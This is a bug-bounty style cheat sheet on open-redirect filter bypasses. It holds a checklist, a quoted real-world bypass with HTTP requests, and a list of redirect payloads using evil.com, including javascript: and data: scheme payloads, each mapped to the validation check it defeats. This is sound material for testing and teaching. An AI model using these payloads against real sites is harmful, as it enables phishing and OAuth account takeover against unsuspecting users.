# Open Redirect Bypass Techniques

Most "protected" redirect parameters aren't blocked — they're filtered with a weak `contains`/`endsWith`/regex rule that only checks the URL string, not where the browser will actually navigate. Bypassing these converts a rejected payload into a working redirect to an arbitrary domain, which matters most when the redirect sits in a login, SSO, or email link that victims trust. Impact mirrors open redirection: phishing with a legit-domain entry point, and full account takeover when chained with OAuth flows.

Hunting workflow & finding hidden redirect params: [Open_Redirection_Hunting.md](./Open_Redirection_Hunting.md)

## Hunting Checklist

1. Confirm the filter type first: does it reject `https://evil.com`, accept relative paths only, or only allowlist your domain?
2. Try the string-level tricks (suffix subdomain, `@` credentials, path/query/fragment embedding) — one usually slips past a `contains`/`endsWith` regex.
3. Try parser-difference tricks: protocol-relative `//`, backslash `/\`, missing scheme — browsers normalize these differently than a WAF regex does.
4. Check case, whitespace, and encoding (`%09`, `%0a`, double `//`) against naive pattern matching.
5. If the app validates only the *first* occurrence, supply the parameter twice (HTTP parameter pollution).
6. Verify the final navigation in a real browser (`curl -I` shows `Location:`, but only the browser confirms you land on the attacker host).

## Test Cases & Examples

### Real-world bypass (subdomain-prefix / bad regex)

Write-up of the original find:

1. Redirect attempt `https://targetweb.com?url=http://attackersite.com` did **not** redirect (blocked).
2. Created a new subdomain `www.targetweb.com.attackersite.com` (under attacker control).
3. Retried with `https://targetweb.com?url=www.targetweb.com.attackersite.com`.
4. The site **successfully redirected** to `www.targetweb.com.attackersite.com`.
5. The validation only checked that the URL *contained/started with* `targetweb.com` — the bad regex made the protection useless.

Requests:

```http
GET /?url=http://attackersite.com HTTP/1.1
Host: targetweb.com
```

```http
GET /?url=www.targetweb.com.attackersite.com HTTP/1.1
Host: targetweb.com
```

```http
HTTP/1.1 302 Found
Location: http://www.targetweb.com.attackersite.com
```

Author: **[@bishal0x01](https://twitter.com/bishal0x01)** · Reference: https://twitter.com/bishal0x01/status/1262021038080053248

### Standard bypass payload list

Replace `target.com` with the victim domain, `evil.com` with yours, `?url=` with the found parameter:

```text
?url=https://evil.com
?url=https://evil.com/#target.com          # contains target.com → endsWith/contains checks pass
?url=https://evil.com/?target.com
?url=https://evil.com/path=target.com
?url=https://target.com.evil.com            # attacker subdomain named after victim
?url=https://evil.com\@target.com           # credentials confusion (userinfo before @)
?url=https://evil.com\ttarget.com           # tab/CRLF breaks naive parsers
?url=//evil.com                             # protocol-relative
?url=/\evil.com                             # slash-backslash → browser reads //evil.com
?url=\/\/evil.com
?url=/\/evil.com
?url=target.com.evil.com
?url=.%09/target.com                        # whitespace encoding
?url=/%09/target.com
?url=javascript:alert(1);//                 # where the sink is href/location JS (see note)
?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
?url=vbscript:msgbox(1)                     # legacy IE contexts only
?url=ftp://evil.com
?url=https://evil.com/https://target.com
?url=https://evil.com?redirect=target.com
?url=..%2f..%2f..%2f@evil.com
?url=https://target.com@evil.com
```

## Bypass Techniques

Quick map of payload → the check it defeats:

- **`endsWith("target.com")`** → `https://evil.com/#target.com`, `https://evil.com/?target.com`, `https://evil.com/path=target.com` (legit string is at the end of the value, but the *host* is attacker's).
- **`contains("target.com")`** → `https://target.com.evil.com`, `https://evil.com/https://target.com`, credential form `https://target.com@evil.com`.
- **Regex missing `^`/`$` anchors or URL parsing** → protocol-relative `//evil.com`, backslash `/\evil.com`, tab/CR padding.
- **Validation only on GET** → same payload via POST body; **only first param checked** → `?url=https://target.com&url=https://evil.com`.
- **Allowlist of paths only** → absolute URL injection; **URL parser differences** between the validator and the browser are the root cause of nearly all of these — that's also what makes them reportable ("validation bypass", not just "redirect").

## Tools & Resources

- Payload collection: PayloadsAllTheThings [Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect) — this doc mirrors its widely-known standard set
- OWASP [Unvalidated Redirects and Forwards](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards)
- PortSwigger Web Security Academy: *Location hijacking via redirect parameter*
- Helpers: Burp Repeater + match/replace on `Location`, `curl -sI` per payload, ffuf for parameterized fuzzing

## Report Tips

- Lead with the chain, not the redirect: "phishing link that shows only `target.com` in the address bar while landing on attacker content," or `redirect_uri` → stolen OAuth code/token → account takeover.
- Include the blocked payload and the working bypass payload side by side — the contrast is the actual bug (validation logic), and it preempts "won't fix / informational."
- Demonstrate the final `Location:` header and the browser's resulting page/URL in a recording; state the victim context (logged-in page, email link, SSO hop) where the redirect is reachable.
